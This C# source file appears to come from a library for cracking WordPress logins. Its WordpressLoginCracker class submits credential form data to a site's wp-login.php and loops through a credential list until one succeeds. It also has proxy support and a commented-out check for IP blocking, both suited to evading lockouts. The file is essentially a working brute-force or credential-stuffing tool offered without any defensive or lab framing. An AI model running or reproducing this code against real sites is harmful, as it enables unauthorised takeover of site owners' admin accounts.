using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Entities.Interfaces;
using Opapps.Lib.WordpressCracker.Services.Abstracts;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Opapps.Lib.WordpressCracker.Services
{
    public class WordpressLoginCracker : WordpressCrackerService
    {

        public WordpressLoginCracker() : base() { }

        /// <summary>
        /// Create an object of this class with a custom <c>RequestConfiguration</c> object. This is particularly useful to set a proxy.
        /// </summary>
        public WordpressLoginCracker(IRequestConfiguration config) : base(config) { }

        /// <summary>
        /// Attempt to login to <paramref name="loginUrl"/> with <paramref name="loginCredential"/> using form-data authentication. 
        /// </summary>
        /// <param name="loginUrl">The WordPress login page URL. For example: new Uri(https://example.com/wp-login.php)</param>
        /// <param name="loginCredential">The login credential that contains username and password to attempt the login.</param>
        /// <returns>Boolean indicating whether the attempt is successful</returns>
        public async Task<bool> AttemptLoginAsync(Uri loginUrl, FormData loginCredential)
        {
            //await EnsureIpAddressNotBlocked();
            using HttpResponseMessage response = await PostAsync(loginUrl, loginCredential);
            response.EnsureSuccessStatusCode();
            return CheckLoginSuccess(loginUrl, response);
        }

        /// <summary>
        /// Attempt to login to <paramref name="loginUrl"/> with each of the <paramref name="loginCredentials"/> using form-data authentication. 
        /// </summary>
        /// <param name="loginUrl">The WordPress login page URL. For example: https://example.com/wp-login.php</param>
        /// <param name="loginCredentials">The login credentials that to attempt the login.</param>
        /// <returns>The successful <c>FormData</c> object if presents, otherwise returns null.</returns>
        public async Task<FormData?> AttemptLoginRangeAsync(Uri loginUrl, IEnumerable<FormData> loginCredentials) {
            FormData? correctLoginCredential = null;
            
            foreach(var loginCredential in loginCredentials)
            {
                bool isSuccess = await AttemptLoginAsync(loginUrl, loginCredential);

                if (isSuccess)
                {
                    correctLoginCredential = loginCredential;
                    break;
                }
            }

            return correctLoginCredential;
        }

        private bool CheckLoginSuccess(Uri loginUrl, HttpResponseMessage response)
        {
            string? responseAbsolutePath = response?.RequestMessage?.RequestUri?.AbsolutePath;
            if (responseAbsolutePath == null) return false;
            return responseAbsolutePath.Contains("wp-admin") || (!responseAbsolutePath.Contains("wp-login.php") && !responseAbsolutePath.Contains(loginUrl.AbsolutePath));
        }

    }
}
